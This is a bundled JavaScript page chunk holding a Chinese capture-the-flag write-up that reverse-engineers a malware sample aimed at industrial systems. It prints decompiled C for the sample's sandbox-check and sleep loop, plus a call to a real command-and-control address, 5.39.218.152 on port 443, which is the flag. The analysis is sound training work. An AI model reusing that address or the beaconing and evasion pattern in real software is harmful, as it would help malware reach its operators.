"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[159],{70694:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>a,contentTitle:()=>d,default:()=>p,frontMatter:()=>c,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"Independent-Environment/Fengtaisec/14","title":"\u6076\u610f\u8f6f\u4ef6\u540e\u95e8\u5206\u6790","description":"\u5de5\u7a0b\u5e08\u7684\u7b14\u8bb0\u672c\u4e0a\u53d1\u73b0\u4e86\u6076\u610f\u8f6f\u4ef6\uff0c\u7ecf\u6392\u67e5\u662f\u4e00\u6b3e\u8457\u540d\u9488\u5bf9\u5de5\u4e1a\u9886\u57df\u7684\u75c5\u6bd2\uff0c\u6eaf\u6e90\u5206\u6790\u8fdc\u63a7\u6837\u672c\u6587\u4ef6\uff0c\u786e\u8ba4\u8fdc\u7a0bC&C\u8fde\u63a5\u5730\u5740\u3002","source":"@site/docs/Independent-Environment/Fengtaisec/14.md","sourceDirName":"Independent-Environment/Fengtaisec","slug":"/Independent-Environment/Fengtaisec/14","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/Fengtaisec/14","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/Fengtaisec/14.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"\u75c5\u6bd2\u6587\u4ef6\u6062\u590d","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/Fengtaisec/139"},"next":{"title":"\u7b80\u5355Modbus\u534f\u8bae\u5206\u6790","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/Fengtaisec/140"}}');var i=t(74848),r=t(28453);const c={},d="\u6076\u610f\u8f6f\u4ef6\u540e\u95e8\u5206\u6790",a={},o=[];function l(e){const n={admonition:"admonition",code:"code",h1:"h1",header:"header",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"\u6076\u610f\u8f6f\u4ef6\u540e\u95e8\u5206\u6790",children:"\u6076\u610f\u8f6f\u4ef6\u540e\u95e8\u5206\u6790"})}),"\n",(0,i.jsxs)(n.admonition,{type:"note",children:[(0,i.jsx)(n.p,{children:"\u5de5\u7a0b\u5e08\u7684\u7b14\u8bb0\u672c\u4e0a\u53d1\u73b0\u4e86\u6076\u610f\u8f6f\u4ef6\uff0c\u7ecf\u6392\u67e5\u662f\u4e00\u6b3e\u8457\u540d\u9488\u5bf9\u5de5\u4e1a\u9886\u57df\u7684\u75c5\u6bd2\uff0c\u6eaf\u6e90\u5206\u6790\u8fdc\u63a7\u6837\u672c\u6587\u4ef6\uff0c\u786e\u8ba4\u8fdc\u7a0bC&C\u8fde\u63a5\u5730\u5740\u3002"}),(0,i.jsxs)(n.p,{children:["flag\u5f62\u5f0f\u4e3a ",(0,i.jsx)(n.code,{children:"flag{}"})]})]}),"\n",(0,i.jsxs)(n.p,{children:["\u9898\u76ee\u63d0\u4f9b\u4e86",(0,i.jsx)(n.code,{children:"f67b65b9346ee75a26f491b70bf6091b"}),"\u53ef\u6267\u884c\u6587\u4ef6"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:t(3938).A+"",width:"1084",height:"797"})}),"\n",(0,i.jsx)(n.p,{children:"\u5bf9\u5176\u8fdb\u884c\u9006\u5411\u5206\u6790"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:t(57622).A+"",width:"2053",height:"1328"})}),"\n",(0,i.jsxs)(n.p,{children:["\u4ece",(0,i.jsx)(n.code,{children:"start"}),"\u8ddf\u8fdb\u5230",(0,i.jsx)(n.code,{children:"sub_402261"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:"int sub_402261()\n{\n    struct _SYSTEMTIME SystemTime; // [esp+0h] [ebp-14h] BYREF\n    DWORD dwMilliseconds; // [esp+10h] [ebp-4h] BYREF\n\n    SetLastError(0);\n    if ( GetLastError() != 183 )\n    {\n        dwMilliseconds = 5000;\n        SetUnhandledExceptionFilter(TopLevelExceptionFilter);\n        if ( !GetSystemMetrics(67) )\n        {\n            if ( sub_4023A8() )\n            {\n                while ( 1 )\n                {\n                    do\n                    {\n                        Sleep(dwMilliseconds);\n                        GetLocalTime(&SystemTime);\n                    }\n                    while ( SystemTime.wHour >= 0x18u );\n                    sub_402174(&dwMilliseconds);\n                }\n            }\n        }\n    }\n    return 0;\n}\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u7ee7\u7eed\u8ddf\u8fdb\u5230",(0,i.jsx)(n.code,{children:"sub_402174"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:t(67103).A+"",width:"2053",height:"1328"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5176\u4e2d",(0,i.jsx)(n.code,{children:'v1 = (void *)sub_40204D(L"5.39.218.152", 0x1BBu);'}),"\u770b\u8d77\u6765\u5f88\u53ef\u7591\uff0c\u8ddf\u8fdb\u5206\u6790",(0,i.jsx)(n.code,{children:"sub_40204D"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:t(84363).A+"",width:"2053",height:"1456"})}),"\n",(0,i.jsx)(n.p,{children:"\u5f88\u660e\u663e\u7684\u5916\u8054\u884c\u4e3a\uff0c\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",children:"flag{5.39.218.152}\n"})})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},3938:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20241246-234657-37f6d0b1603b53256d441f8876455aef.png"},57622:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20241248-234853-32a73f2b0453351523616ddb8a309502.png"},67103:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20241249-234954-3f35b746b199b7e3f57f119eb8580eb9.png"},84363:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20241250-235054-e0bf4b1eb52b597fc686a8253104a9bb.png"},28453:(e,n,t)=>{t.d(n,{R:()=>c,x:()=>d});var s=t(96540);const i={},r=s.createContext(i);function c(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);